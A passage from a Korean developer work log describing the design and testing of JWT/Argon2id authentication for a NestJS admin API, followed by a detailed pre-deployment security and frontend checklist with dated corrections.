아이디가 틀렸는지 비밀번호가 틀렸는지 구분하지 않고 `401 아이디 또는 비밀번호가 올바르지 않습니다.` 하나로 응답한다. 메시지만 같게 해도 **응답 시간 차이로 계정 존재 여부가 드러나므로**, 계정이 없을 때도 더미 해시를 상대로 검증 비용을 동일하게 치른 뒤 실패시킨다(`burnVerifyCost`). 더미 해시는 기동 시 난수로 만들어 대응하는 평문이 어디에도 없다.

**5) 전역 Guard (`auth/jwt-auth.guard.ts`, `auth/public.decorator.ts`)**

`JwtAuthGuard`를 `APP_GUARD`로 등록해 **전역 적용**하고, 공개가 필요한 라우트에만 `@Public()`을 붙인다. 현재 공개 라우트는 `GET /health`와 `POST /auth/login` 둘뿐. 검증용 보호 엔드포인트로 `GET /auth/me`를 뒀다.

**6) 부수 변경**

- `main.ts`에 전역 `ValidationPipe` (`whitelist` + `forbidNonWhitelisted` + `stopAtFirstError`). 3~6단계의 수정 API에서 의도치 않은 컬럼이 덮어써지는 것을 막기 위한 사전 세팅이기도 하다
- `GET /health`에 `@Public()` — 전역 Guard 도입으로 그냥 두면 헬스체크가 막힌다

### 기술 판단

| 쟁점 | 선택 | 이유 |
| ---- | ---- | ---- |
| 해싱 알고리즘 | **Argon2id** (bcrypt ✗) | OWASP 1순위 권장. bcrypt는 메모리 하드하지 않아 GPU 공격에 상대적으로 약하고 72바이트 입력 잘림 제약이 있다. 관리자 계정 하나짜리 규모에서 둘 다 "충분히" 안전하지만, 지금 고르는 비용이 같으므로 더 나은 쪽을 고름 |
| Argon2 구현체 | **`@node-rs/argon2`** (`argon2` ✗) | napi-rs 사전 빌드 바이너리를 제공해 Windows 개발 환경에서 node-gyp/빌드 툴체인이 필요 없다. `win32-x64-msvc`와 `linux-x64-gnu/musl`이 모두 있어 향후 배포 환경도 커버 |
| Passport 사용 | **미사용** — `@nestjs/jwt` + 직접 구현 Guard | 전략이 JWT 하나뿐인데 `@nestjs/passport`/`passport`/`passport-jwt`가 붙으면 의존성 3개와 간접 계층만 늘어난다. Guard가 40줄이라 흐름을 전부 눈으로 따라갈 수 있는 쪽을 택함 (포트폴리오 서사의 "인증까지 직접 설계·구현"과도 맞음) |
| 토큰 만료 | **2시간** (`JWT_EXPIRES_IN`으로 조정 가능) | 학기 데이터를 한 번에 몰아 입력하는 용도라 너무 짧으면 입력 도중 로그인이 풀린다. 반대로 MVP에는 refresh 토큰도 서버측 무효화도 없어서 **이 값이 곧 "토큰 유출 시 살아있는 시간"**이다. 로그아웃도 클라이언트가 토큰을 버리는 것뿐이라, 실질적 강제 만료 수단은 `JWT_SECRET` 교체밖에 없다. 세션 길이를 늘려야 하면 만료를 늘릴 게 아니라 refresh 토큰을 도입하는 쪽이 맞다 |
| 초기 계정 시딩 | **대화형 입력** (CLI 인자 ✗, 환경변수 ✗) | CLI 인자는 셸 히스토리와 프로세스 목록에 평문이 남는다. 환경변수(`.env`)는 계정을 만든 뒤에도 평문 비밀번호가 파일에 계속 남는데, 이 레포는 Public이고 `.env`는 gitignore에만 의존한다. 대화형 입력은 히스토리·프로세스 인자·파일 어디에도 남지 않는다 |
| Guard 적용 방식 | **전역 `APP_GUARD` + `@Public()`** (`@UseGuards` ✗) | 기본값이 "인증 필요"가 되는 fail-closed 구조. 3~6단계에서 라우트를 추가하며 `@UseGuards`를 깜빡해 쓰기 엔드포인트가 열린 채 나가는 사고를 구조적으로 막는다. 대신 공개 라우트에 `@Public()`을 빠뜨리면 즉시 401로 드러나므로 실수의 방향이 안전한 쪽이다 |
| BigInt 직렬화 | **경계에서 명시 변환** (전역 `BigInt.prototype.toJSON` 패치 ✗) | §9에서 3단계 시작 시점에 정하기로 했던 항목이 `/auth/me` 때문에 먼저 걸렸다. 이번엔 `id.toString()`으로 응답 경계에서만 바꿨다. 전역 프로토타입 패치는 앱 전체의 JSON 동작을 바꾸는 부작용이 있어, 레코드를 목록으로 싣기 시작하는 3단계에서 인터셉터 방식까지 포함해 다시 판단한다 |

### 검증

**단위 테스트 17개** (`npm test`, `auth.service.spec.ts` / `jwt-auth.guard.spec.ts`) — 프로덕션 DB에 시험용 계정을 만들지 않고 로그인 **성공 경로**까지 검증하기 위해, `PrismaService`만 대역으로 두고 해싱·서명은 실제 구현을 그대로 쓴다.

- 올바른 자격증명 → 검증 가능한 토큰 발급, `sub`가 관리자 id
- 토큰 페이로드 키가 정확히 `sub`/`iat`/`exp`뿐 (민감정보 미포함)
- 비밀번호 오류·계정 없음의 **에러 메시지가 동일**
- 계정이 없어도 `burnVerifyCost`가 호출됨
- 해시가 평문을 포함하지 않고 `$argon2id$` + `m=19456,t=2,p=1`, 같은 비밀번호도 매번 다른 해시(salt)
- Guard: 토큰 없음/위조 서명/만료/Bearer 아님 → 전부 401이고 **메시지가 서로 구분되지 않음**, `@Public()` → 통과

**런타임 검증** (`node dist/main.js`, 임시 시크릿 사용)

| 요청 | 결과 |
| ---- | ---- |
| `GET /health` (토큰 없음) | `200` — 공개 유지 확인 |
| `GET /auth/me` (토큰 없음 / Bearer 아님 / 위조 서명) | 모두 `401 인증이 필요합니다.` |
| `POST /auth/login` (없는 계정) | `401 아이디 또는 비밀번호가 올바르지 않습니다.` |
| `POST /auth/login` (빈 비밀번호 / 필드 누락) | `400` + 필드당 메시지 1개 |
| `POST /auth/login` (DTO에 없는 필드 포함) | `400 property isAdmin should not exist` |
| `JWT_SECRET` 미설정 상태로 기동 | 기동 실패 (`Configuration key "JWT_SECRET" does not exist`) |

없는 계정에 대한 로그인 응답 시간은 **약 23~38ms**로, 해시 검증을 건너뛰던 상태(약 2ms)와 뚜렷이 구분된다 — 타이밍 동일화가 실제로 동작함을 확인.

**시드 스크립트** — DB에 쓰지 않는 경로(짧은 비밀번호/확인 불일치/빈 아이디/아이디와 동일한 비밀번호/입력 중단/CRLF)를 전부 확인했고, 마스킹(`*`)도 동작. 검증 후 `AdminUser` 행 수가 여전히 0인 것을 SQL로 확인했다.

**회귀 없음** — 루트 `npm run build`(Next.js 프로덕션 빌드) 정상, `apps/api` `npm run lint` 정상.

**남은 검증 1건**: 실제 계정으로의 엔드투엔드 로그인은 계정 시딩이 선행돼야 하므로 사용자가 직접 수행한다(아래 절차). 단위 테스트가 같은 경로를 대역으로 덮고 있지만, 실제 DB 레코드를 거치는 경로는 아직 실행되지 않았다.

> 검증 중 포트 3001을 1단계 때 띄워둔 서버가 점유하고 있어 요청이 그쪽으로 가는 일이 있었다(라우트가 없어 전부 404). 남의 프로세스를 죽이는 대신 3002로 검증했다. **증상이 401이 아니라 404면 Guard 문제가 아니라 다른 서버에 붙은 것**을 먼저 의심할 것.

### 초기 계정 생성 절차

```bash
cd apps/api
# 1) .env에 JWT_SECRET 생성해서 넣기 (값은 아래 명령 출력을 붙여넣는다)
node -e "console.log(require('node:crypto').randomBytes(48).toString('base64url'))"
# 2) 대화형으로 계정 생성 (아이디/비밀번호는 입력 시점에만 존재, 12자 이상)
npm run seed:admin
```

### 이 단계에서 의도적으로 하지 않은 것

- ~~**로그인 시도 횟수 제한(rate limiting)**~~ **[완료 2026-09-21, §16]** — 현재 `POST /auth/login`은 무제한 시도가 가능하다. Argon2id 검증 비용(약 20ms)이 약간의 완충은 되지만 방어책이 아니다. **API를 외부에 배포하기 전에 반드시 선행되어야 하는 항목**(`@nestjs/throttler`). 지금은 로컬 전용이라 미적용
- **refresh 토큰 / 서버측 토큰 무효화** — 위 만료 시간 판단 참조. 필요해지는 시점은 7단계(관리자 프론트)에서 실제 사용 패턴이 나온 뒤
- ~~**CORS 설정**~~ **[완료 2026-09-21, §16]** — 프론트(3000)에서 API(3001)를 호출하는 7단계에서 필요. 지금 열어둘 이유가 없다
- **관리자 프론트 로그인 페이지** — 빌드 순서 7단계
- **팀/곡/유튜브 CRUD 라우트** — 3~6단계. 이번 Guard를 그대로 재사용하면 된다 (3단계 팀 CRUD는 §11, 4단계 곡 CRUD는 §12, **5단계 카드뉴스 업로드 `F007`·앨범 커버 자동 매칭 `F010`은 §13에서 완료**. 세 단계 모두 Guard 재사용 확인됨 — 특히 F007은 실제 Nest 앱을 띄워 **Guard가 multipart 파서보다 먼저 실행되어 미인증 요청의 파일이 파싱조차 되지 않는 것**을 확인했다. 남은 것은 6단계 유튜브 F011~F013 — **F013(수동 수정)은 §14에서 완료**, 남은 것은 6단계 2/2의 F011/F012 → **§15에서 API 구현 완료(2026-09-20). 실제 YouTube API 호출(게이트 2)·쓰기 검증은 대기**)
- ~~**`Setlist.youtubeReviewStatus` 컬럼**~~ — §9에 이어 4단계까지 보류했다가 **6단계 1/2에서 추가 완료(2026-09-20, §14)**. 컬럼만 먼저 만들면 아무도 읽지 않는 상태 값이 남는다는 이유로 미뤄 왔는데, F013이 이 컬럼에 쓰기 시작하는 시점에 함께 넣었다. Postgres enum(`pending`/`approved`/`rejected`)이며 기존 5건은 `approved`, 나머지 59건은 `pending`

#### 7단계(배포/관리자 프론트) 전 확인 항목

위 rate limiting·CORS와 함께 배포 전에 반드시 확인해야 하는 항목을 여기에 모아 둔다.

> **2026-09-21 갱신 (work02-7a, §16)**: 이 목록 중 로그인 시도 제한·CORS·전역 예외 필터·스펙 포함 타입 검사·`directUrl`·`pg_policies` 재확인은 **처리했다**(항목별로 취소선과 결과를 붙였다). **남은 항목**: 권한 회수 **실행 여부**(초안은 §16), JWT 방식 결정(현행 유지가 이번 결정), `TRUST_PROXY_HOPS`·`CORS_ALLOWED_ORIGINS`의 배포 값, 배포 후 확인 사항, 업로드 본문 상한과 배포 플랫폼 타임아웃 확인, 비밀값 보관 위치, 프론트 항목(id 범위 폴백·`open-track-video` 예외 처리·홈 캐러셀 노출·썸네일 도메인), **관리자 UI 요건 전부(그대로 유지)**.
>
> **2026-09-21 교차 리뷰 반영 (§16 "교차 리뷰 반영")**: 전역 Guard 순서(`GlobalGuard`로 코드 고정), 예외 로그 허용 목록, `SyntaxError` 위장 제거, 필터 안전망, CORS `http:` 루프백 한정, 기동 오류의 입력 값 미출력, CI 러너 고정을 **처리했다.** **새로 생긴 남은 항목**: `TRUST_PROXY_HOPS` **배포 체크리스트**(앱 포트는 프록시에서만 접근, `X-Forwarded-For` 위조·홉 수 실측 필수), 관리자 UI의 **로그인 제출 전 검증**(L5), 앱 포트 바인딩 호스트, `teamIds` 길이 상한(L9), `/health/db` 제한 재검토(L7), CI의 첫 GitHub 실행 확인.

> **2026-09-22 갱신 (work02-7b, §17)**: 이 목록의 **프론트 항목을 처리했다** — id 범위 폴백(일차·팀명·이미지) 제거와 `dayN` 기준 통일, 홈 캐러셀 노출 규칙, `open-track-video` 예외 처리·검증, 프론트 실시간 폴백(`top-video`) 제거(검색 결과 링크로 대체). 항목별로 취소선과 결과를 붙였다. **남은 항목**: 썸네일 도메인(`remotePatterns`), 관리자 UI 요건 전부(그대로 유지), `apps/api`의 낡은 참조 정리(§17 "남겨둔 결정"), 캐러셀 라벨, `setlistCards` 정적 폴백, 배포 후 사용자 작업(§17).

> **2026-09-22 갱신 (work02-7c-1, §18)**: 관리자 프론트(`apps/admin`) 뼈대를 만들며 **로그인 제출 전 검증(L5)**을 처리했다(서버 DTO와 같은 규칙, 429 `Retry-After` "N분 뒤" 안내, 새로고침 뒤에도 유지되는 버튼 잠금, 남은 시도 횟수 미표시). **새로 생긴 남은 항목**: `next` 16.2.4의 `npm audit` critical(공개 사이트와 admin 모두, §18 "남겨둔 결정 1"), CSP 이미지 호스트 추가 시점(7c-2~4), `NEXT_PUBLIC_PUBLIC_SITE_ORIGIN` 실사용(7c-2), 배포 시 admin 오리진의 `CORS_ALLOWED_ORIGINS`와 Vercel Ignored Build Step(§18 "7d 내가 할 일"). §10의 나머지 관리자 UI 요건(팀·곡·앨범 커버·유튜브 화면)은 **그대로 유지**하고 7c-2~4에 매핑했다.

- ~~**공개 프론트의 팀 id 범위 하드코딩**~~ **[완료 2026-09-22, §17: id 범위 추정(일차·팀명·이미지)을 제거하고 `Line Up.day`(`dayN`)만 인정. 두 페이지의 규칙을 `src/lib/line-up.ts`로 통일]** (2026-09-19, §11 조사 중 발견) — `src/app/setlist/page.tsx`와 `src/app/event-goods/page.tsx`가 `day`/`image_src`가 비었을 때 **팀 id 범위로 일자·팀명·이미지를 추정하는 폴백**을 갖고 있다. 두 파일의 구현이 서로 다른 것이 특히 문제다.
  - `setlist/page.tsx`: `id 1~7 → day1`, `id 8~14 → day2`, 그 외 `null`(= 렌더링 제외)
  - `event-goods/page.tsx`: `id 1~7 → day1`, **`id >= 8 → day2` (상한 없음)** → id 16 이상의 신규 팀이 무조건 2일차로 분류된다
  - `getImageFallbackPath(16)`은 에러가 아니라 **`/day1-team1.png`(8C8 사진)** 을 돌려준다
  - > **정정 (2026-09-20, §13 조사)**: 원래 이 자리에 "즉 깨진 이미지가 아니라 **엉뚱한 이미지가 뜬다**", "팀 등록 → 공개 페이지에 **8C8 사진으로 노출**"이라고 적었는데 **사실이 아니다.** 폴백 경로가 계산되기는 하지만 **화면에 도달하지 않는다** — `event-goods-view.tsx:63-70`이 `coverShape === "square"`(= 곡에 `album`이 없음)이면 `SquareGrayArtwork`로 분기해 `team.imageSrc`를 아예 쓰지 않기 때문이다. `/setlist`는 `id <= 14` 상한 때문에 카드 자체가 제외된다. `team.imageSrc` 폴백은 사실상 도달 불가 코드다.
    >
    > **실제로 가능한 노출 경로는 이미지가 아니라 팀명과 곡 목록이다**: "팀 등록 **+ 곡 등록** → `/event-goods` 2일차에 `팀명 + 곡 목록` 노출". 이미지 오노출이 아니라 **일자 오분류**가 버그의 본체다.
    >
    > 원인: `event-goods-view.tsx`의 렌더링 분기를 읽지 않고 `event-goods/page.tsx`의 데이터 조립만 보고 일반화했다. §11에서 "`setlist/page.tsx`만 보고 일반화했다"고 반성해 놓고 **같은 실수를 한 단계 아래에서 반복**한 것이다 — 페이로드에 들어가는 것과 화면에 그려지는 것은 다르다.
    >
    > **정정의 정정 (2026-09-22, §17 조사)**: 위 정정의 "`/setlist`는 `id <= 14` 상한 때문에 카드 자체가 제외된다"는 **`day` 문자열이 `day1`/`day2`와 일치하지 않을 때만** 맞다. `getDayFromRow`는 문자열 매칭을 id 범위보다 먼저 하므로, `day=day2`로 등록한 팀은 id가 15 이상이어도 카드가 만들어지고 `image_src`가 비어 있으면 `getImageFallbackPath`가 `/day1-team1.png`(8C8 사진)를 돌려주며 `LineupCard`·모달이 이를 **그대로 그렸다**(`isPosterDummy`는 항상 false). 즉 **`/setlist`에서는 이미지 폴백이 화면에 도달했다.** 기준선(`16986ca`) 소스를 그대로 실행한 정적 픽스처(id 16, `day2`, `image_src` NULL)로 확인했다 — 브라우저 화면 재현은 아니다(서버 컴포넌트가 프로덕션 Supabase를 읽어 픽스처를 주입할 수 없다). `/event-goods`의 이미지 폴백은 정정대로 도달하지 않는다. 이번 단계에서 두 경로 모두 제거했다.
  - **어드민으로 만든 팀은 F007(카드뉴스 업로드, 5단계) 전까지 `image_src`가 NULL**이므로 이 폴백을 그대로 탄다
  - 지금 당장 터지지 않는 이유는 기존 15행이 `day`/`image_src`를 모두 채우고 있어 폴백이 호출되지 않기 때문이다. **정리 시점: 7단계, 실제 팀을 등록하기 전**(2026-09-20 조정. 이전에는 "work03에서"였으나, 관리자 페이지로 팀을 등록하는 순간 이 폴백을 타므로 그보다 앞당겨야 한다). 폴백을 제거하거나 최소한 두 파일의 규칙을 통일한다

- **Storage 버킷 설정과 키 관리** (2026-09-20, §13에서 추가) — 버킷 `team-cards`의 실제 스펙(public 읽기 / `file_size_limit` 2MB / `allowed_mime_types` 3종 / **쓰기 정책 없음**)이 제안 스펙과 일치하는지 배포 전에 다시 확인한다. `SUPABASE_SECRET_KEY`는 RLS를 전부 우회하는 값이므로 **프론트 번들에 들어가지 않는지**(`NEXT_PUBLIC_` 접두사 금지)와 Vercel/배포 환경 변수에 서버 전용으로만 설정됐는지를 함께 본다
- **`next.config.ts`의 `images.remotePatterns`** (2026-09-20, §13에서 추가) — Storage 공개 URL은 `**.supabase.co`에 이미 매칭되므로 **지금은 수정이 필요 없다.** 단 현재 카드 이미지 렌더링 3곳이 모두 `unoptimized`라 최적화 경로를 타지 않는 상태이므로, `unoptimized`를 떼는 작업을 할 때 remotePatterns와 앨범 커버 호스트 allowlist(`is1-ssl.mzstatic.com`)를 함께 점검한다
- **업로드 이미지의 비율·해상도** (2026-09-20, §13에서 추가) — 서버는 **비율도 해상도도 검증하지 않는다.** 매직바이트로 형식만 보고 크기 상한만 건다. 기존 15개가 전부 819×1024(4:5)인데 다른 비율이 올라오면 카드가 `object-cover`로 잘려 보인다. 해결은 서버 검증이 아니라 **7단계 관리자 UI에서 권장 비율(4:5) 안내 또는 업로드 전 크롭**으로 처리한다 — 서버에서 막으면 관리자가 이유를 모른 채 거부당하고, 서버 리사이즈는 이번 스코프 밖이다
- ~~**홈 캐러셀 노출 확인**~~ **[완료 2026-09-22, §17: 팀명 + 이미지 + 유효한 day(`dayN`)가 있는 팀만 노출. 이미지 업로드 전·일차 미정 팀은 홈에 나가지 않는다]** (2026-09-20, §13에서 추가) — `card-carousel.tsx`는 `day` 필터 없이 `Line Up` 전체를 읽고 `image_src`가 채워진 행을 **전부** 포스터로 띄운다(`:190`). 즉 관리자 페이지로 팀을 만들고 이미지를 올리는 순간 홈 첫 화면에 바로 나온다. 실제 팀 등록 전에 이 동작이 의도한 것인지 확인한다
- ~~**인바운드 throttler / CORS**~~ **[완료 2026-09-21, §16]** **/ 업로드 본문 크기 제한 [남음: 배포 플랫폼 확인]** — 위 rate limiting·CORS 항목과 같은 묶음. 업로드 본문 상한은 앱 레벨(multer `limits`)에 명시해 뒀으므로(§13), 배포 플랫폼이 그보다 **작은** 본문 상한을 걸고 있지 않은지만 확인하면 된다

- **앨범 커버 관리자 UI의 필수 요건** (2026-09-20, §13에서 추가) — F010은 API만 만들었고, 실제로 쓸 수 있으려면 7단계 UI가 아래 둘을 **반드시** 제공해야 한다. 하나라도 빠지면 API가 있어도 쓸 수 없다.
  - **후보 썸네일 선택** — `GET /songs/:id/album-cover/candidates`가 최대 5개를 돌려주는데, 자동 반영을 하지 않기로 했으므로 **사람이 눈으로 고르는 화면이 곧 기능의 전부**다. 응답의 `artworkUrl`은 600px이므로 목록에서는 기존 `shrinkAlbumCoverUrl`로 줄여 쓰고, 고른 값을 **그대로** `PUT /songs/:id/album-cover`에 되돌려 보내면 된다
  - **iTunes URL 직접 입력 경로** — 벤치마크에서 **후보에 없음 10건 + 후보 0건 1건**이 나왔다. 즉 64곡 중 11곡은 후보 목록만으로는 해결되지 않는다. 관리자가 Apple Music에서 직접 찾은 주소를 붙여 넣을 수 있어야 한다. 서버는 이미 이 경로를 받는다(같은 `PUT` 엔드포인트, allowlist + `600x600bb.jpg` 경로 패턴 검증). **UI는 "왜 거부됐는지"를 안내해야 한다** — 100x100 주소나 다른 `isN-ssl` 호스트를 붙여 넣으면 400이 나는데, 이유를 모르면 관리자가 막힌다
  - **US 스토어프런트 영어 표기 주의 문구** — 후보 목록의 곡명·아티스트명이 **영문으로 나온다**(`빨간 피터`→`Red Peter`, `한로로`→`HANRORO`, 일본곡은 로마자). 한국어로 검색했는데 영어 결과가 뜨는 것이 정상 동작임을 화면에 알려주지 않으면 "검색이 틀렸다"고 오해한다. `country=KR`은 영어 쿼리까지 0건이라 쓸 수 없다는 것이 §13에서 실측으로 확인됐다 — 나중에 누가 "한국어로 나오게 바꾸자"고 할 때 되돌아볼 근거다

- ~~**로그인 제한과 관리자 UI의 제출 전 검증**~~ **[완료 2026-09-22, §18: 제출 전 검증(빈 값·공백 아이디·길이)으로 실패 요청을 보내지 않고, 전송 중 재제출 차단, 429는 `Retry-After`를 "N분 뒤"로 안내하며 새로고침 뒤에도 버튼을 잠근다. 남은 시도 횟수는 표시하지 않는다]** (2026-09-21, §16 교차 리뷰 L5) — 로그인 한도(5분 5회)는 **성공한 로그인과 DTO 400(빈 값 등)도 센다.** 오타를 5번 내면 6번째에는 올바른 비밀번호여도 15분 잠긴다. 관리자 UI는 빈 값·길이를 **서버로 보내기 전에** 막고, 429의 `Retry-After`(CORS로 노출돼 있다)를 "N분 뒤 다시 시도"로 보여 주며, 남은 시도 횟수는 일부러 알려 주지 않는다(`X-RateLimit-*` 숨김)는 점을 감안해 문구를 정해야 한다
- **`TRUST_PROXY_HOPS` 배포 체크리스트** (2026-09-21, §16 교차 리뷰 M1) — 앱 포트는 프록시에서만 접근 가능해야 하고(바인딩 호스트 제한 검토 포함), 프록시가 `X-Forwarded-For`에 실제 IP를 덧붙이며(`$proxy_add_x_forwarded_for`), 홉 수는 실제 프록시 수와 같아야 한다. **배포 서버에서 위조 XFF가 무효인지, 다른 네트워크 클라이언트가 429를 맞지 않는지 실측한다.** 틀리면 요청 제한이 우회되거나 전 사용자가 한 IP로 집계돼 관리자 로그인이 잠긴다. 상세는 §16
- **anon/authenticated 롤의 테이블 권한 회수 검토** **[부분 완료 2026-09-21, §16: 현황 조사·SQL 초안·영향 평가(공개 프론트 영향 없음, 코드 근거)·롤백 SQL 완료. 실행 여부는 미결정(별도 게이트)]** (2026-09-20, §14 작업 중 확인) — `Setlist`·`Line Up` 두 테이블에 `anon`/`authenticated` 롤이 TRUNCATE를 포함한 **전 권한**을 갖고 있다(위 §9 7)에서 확인한 `public` 스키마 기본 ACL `arwdDxtm`과 같은 뿌리). PostgREST는 TRUNCATE를 노출하지 않아 **REST 경로로는 악용이 어렵고**, RLS가 행 단위 쓰기는 막고 있어 지금 당장의 위험은 아니다. 다만 RLS는 TRUNCATE에 적용되지 않으므로 권한 자체가 남아 있는 것은 방어 계층 하나가 비어 있다는 뜻이다. **7단계 배포 전 보안 점검에서 두 테이블의 쓰기성 권한(INSERT/UPDATE/DELETE/TRUNCATE 등) 회수 여부를 검토**한다. `src` 전체에 supabase `insert`/`update`/`upsert`/`delete` 호출이 0건이라 프론트는 SELECT만 쓴다(2026-09-20 grep). 회수해도 프론트 영향은 없을 것이나, 회수 시점에 다시 확인한다
- ~~**anon 쓰기 차단 재확인 (`pg_policies`)**~~ **[완료 2026-09-21, §16: `Setlist`·`Line Up`에 SELECT 외 정책 0건을 직접 조회로 확인]** (2026-09-20 추가) — §8에서 "anon key로 쓰기가 거부되는 것을 확인"했으나, 이번 6단계 1/2 작업에서는 **anon 쓰기 차단을 직접 다시 확인하지 않았다**(anon 조회만 확인). 7단계 보안 점검에서 `pg_policies`로 `Setlist`·`Line Up`에 **SELECT 외 정책이 없는지**를 직접 조회해 확인한다. 위 권한 회수 항목과 한 번에 점검한다
- **서버 비밀값 보관 위치** (2026-09-20 추가) — 지금은 `apps/api/.env`에 서버 전용 비밀값을 둔다(로컬 개발 기준). 배포 시에는 `.env` 파일 대신 **AWS SSM Parameter Store 등 관리형 비밀 저장소로 옮기는 것을 검토**한다. 저장소 선택과 주입 방식은 배포 대상(7단계)이 정해진 뒤에 결정한다
- ~~**프론트 `open-track-video`의 URL 파싱 예외 처리**~~ **[완료 2026-09-22, §17: try/catch + http(s) + YouTube 호스트 허용 목록, 벗어나면 검색 결과로 대체]** (2026-09-20, §14 작업 중 확인) — `src/lib/open-track-video.ts:15`의 `new URL(track.youtubeUrl)`에 **try/catch가 없다.** 같은 함수의 `fetch` 폴백 안쪽(`:36`)은 바깥 `.catch`가 받아 주지만, 이 첫 분기는 동기 코드라 예외가 그대로 던져진다. 브라우저 콘솔에서 `youtubeUrl`에 잘못된 값을 넣으면 클릭 핸들러가 깨진다. 현재 DB 값은 F013이 서버에서 유튜브 URL만 통과시켜 정규화해 저장하므로 **정상 경로에서는 발생하지 않는다** — 다만 work03 대량 삽입처럼 서버 검증을 거치지 않고 들어온 값에는 방어가 없다. **7단계 프론트 수정 항목**: 파싱 실패 시 `fetch` 폴백(검색 결과 페이지)으로 떨어지게 한다

- **저장 형식 DB CHECK 여부** (2026-09-20, §14 교차 리뷰에서 추가) — `youtube_url`이 항상 `https://www.youtube.com/watch?v=<11자>`라는 불변식은 지금 `checkYoutubeUrl` **함수 하나**에만 있다. SQL·work03 대량 삽입·향후 F012 등 다른 쓰기 경로는 아무 문자열이나 넣을 수 있고, 프론트 `open-track-video.ts:15`는 그런 값에서 깨진다(**2026-09-22 §17: 프론트는 파싱 실패·비 YouTube 주소를 검색 결과로 대체하도록 방어했다. DB CHECK 여부 결정은 그대로 남는다**). 형식 CHECK를 걸면 이 결함 계열을 DB가 막아 주지만, work03 대량 삽입이 형식을 어기면 통째로 실패한다(`approved면 URL 있음` CHECK를 걸지 않은 이유와 같은 계열의 트레이드오프). **2/2 설계에서 결정한다.** 결정 전까지는 work03 삽입 시 형식을 별도로 검증한다. 형식 검사는 영상 존재 여부를 보장하지 않는다는 점도 함께 기억한다(예약어 결함이 그 사례)
- ~~**스펙 파일이 빌드·타입 검사에서 제외됨**~~ **[완료 2026-09-21, §16: 오류 8건 해소(서비스 로직 변경 없음), `apps/api`에 `typecheck` 스크립트, GitHub Actions 워크플로 추가]** (2026-09-20, §14 교차 리뷰에서 추가) — `tsconfig.build.json`이 `**/*spec.ts`를 제외하고, `package.json`에 타입 검사 스크립트가 없으며, vitest는 타입을 검사하지 않는다. 그래서 이 브랜치의 픽스처 타입 오류 4건이 CI 없이는 아무도 모르는 채 커밋돼 있었다(이번에 `npx tsc --noEmit -p tsconfig.json`으로 발견·수정). 같은 검사로 **기존 오류 8건이 남아 있다**: `prisma.config.ts` 1, `album-cover.service.spec.ts` 3, `storage/supabase-storage.client.spec.ts` 2, `teams/team-card-image.service.spec.ts` 2 — 이 브랜치가 만든 것이 아니다(추측: 해당 줄이 브랜치 diff 밖에 있음으로 판단, 이전 단계에서 만들어졌는지는 확인하지 않음). **7단계 CI에서 스펙 포함 타입 검사를 넣고, 그 전에 이 8건을 먼저 정리**해야 검사가 통과한다
- ~~**`prisma.config.ts`의 `directUrl` 무시 가능성**~~ **[완료 2026-09-21, §16: `migrate status` 기준 무시됨을 실측으로 확정하고 줄을 삭제했다. `migrate deploy`는 같은 엔진이라 동일할 것으로 추정하나 확인하지 않았다(미확인)]** (2026-09-20, 위 타입 검사에서 발견) — `prisma.config.ts:14`의 `directUrl: env('DIRECT_URL')`이 Prisma 7.10 타입(`url`, `shadowDatabaseUrl`만 있음)에 없어 tsc가 오류를 낸다. 추측: 런타임에서 **무시되어** `migrate deploy`가 주석("마이그레이션용 direct connection")과 달리 `url`(= `DATABASE_URL`, Session pooler)로 접속하고 있을 수 있다. 확인하지 못했다. 지금 실해는 없다 — §14에서 두 값의 문자열이 동일(해시 일치)함을 확인했으므로 어느 쪽으로 붙어도 같은 곳이다. 두 값이 달라지는 순간(pooler와 direct를 분리하는 배포 구성 등) 마이그레이션 접속 경로가 의도와 달라지므로, 7단계 배포 전에 실제로 무시되는지 확인하고 마이그레이션용 URL을 `url`로 지정하는 방식으로 정리한다
- ~~**본문 JSON 파싱 실패 시 오류 메시지 / 전역 예외 필터 부재**~~ **[완료 2026-09-21, §16: 추측이 사실로 확인됐다(본문 앞 10자 에코). 어댑터+전역 필터로 고정 문구 처리]** (2026-09-20, §14 교차 리뷰에서 추가) — `main.ts`에 전역 예외 필터가 없다. 본문이 깨진 JSON이면 파서의 오류 메시지가 400 응답으로 그대로 나가고, Node의 JSON 오류 메시지는 입력의 일부를 포함할 수 있다(추측: 실제 응답은 확인하지 않았다). 이번 diff가 만든 경로는 아니고 기존 동작이다. **7단계 배포 전 점검**에서 실제 응답을 확인하고, 필요하면 전역 필터로 응답 형태를 통일한다
- ~~**`P2025` 외 Prisma 오류의 기본 핸들러 노출 경로**~~ **[완료 2026-09-21, §16: 응답은 500 고정 문구, 로그는 클래스명·code·method·path·상태만. 위 "연결 실패가 호스트를 노출한다"는 응답이 아니라 로그가 경로였다. 다른 경로에서 Prisma 인자에 무엇이 실리는지는 재현하지 못해 미확인이나, 메시지를 로그에 남기지 않으므로 무관해졌다]** (2026-09-20, §14 교차 리뷰에서 추가) — `mapRecordNotFound`는 `P2025`만 404로 바꾸고 나머지 Prisma 오류는 그대로 다시 던진다. 그러면 Nest 기본 핸들러가 로깅하는데, Prisma 오류 메시지는 호출 인자(`data`)를 담을 수 있어 500 로그에 요청 값이 남을 수 있다(추측: 실제로 재현하지는 않았다). F013 경로에서는 값이 정규화된 URL뿐이라 비밀이 아니지만, 이 헬퍼를 쓰는 다른 경로(팀/곡/앨범 커버)에서 인자에 무엇이 실리는지는 확인하지 않았다. 연결 실패 계열(`PrismaClientInitializationError`)이 접속 호스트를 메시지에 담는지도 함께 본다. **7단계**에서 전역 예외 필터와 함께 점검한다

#### 6단계 2/2(유튜브 배치 추천·리뷰) 관련 7단계 항목 (2026-09-20, §15에서 추가)

F011/F012 API는 구현됐지만(§15) 관리자가 실제로 쓰려면 아래가 필요하다. 하나라도 빠지면 API가 있어도 쓸 수 없거나, 배포 후 사고가 된다.

- **추천 리뷰 화면의 필수 요건** — `GET /youtube/recommendations`(기본 `state=open`)가 후보 최대 3개(등수·점수·`videoId`·제목·채널명·썸네일 URL)와 곡 정보, **실제로 보낸 검색어(`query`)** 를 돌려준다. 화면은 (a) 후보를 썸네일·제목·채널명으로 비교해 하나를 고르는 **승인**(`videoId`로 지목), (b) 시도 전체를 버리는 **반려**(사유 입력, 선택), (c) `rejected`/결과 0건 곡의 **재큐**, (d) 추천이 틀렸을 때의 **URL 직접 입력**(F013)을 제공해야 한다. 승인·반려가 `409`(그 사이 F013 수동 입력 / 이미 처리됨)로 거부되면 **목록을 새로 고치라고 안내**해야 한다 — 이유를 모르면 관리자가 막힌다. `expired`(30일 경과)·`superseded` 상태의 시도는 후보가 비어 있으니 "후보 없음"이 아니라 상태 이름으로 안내한다
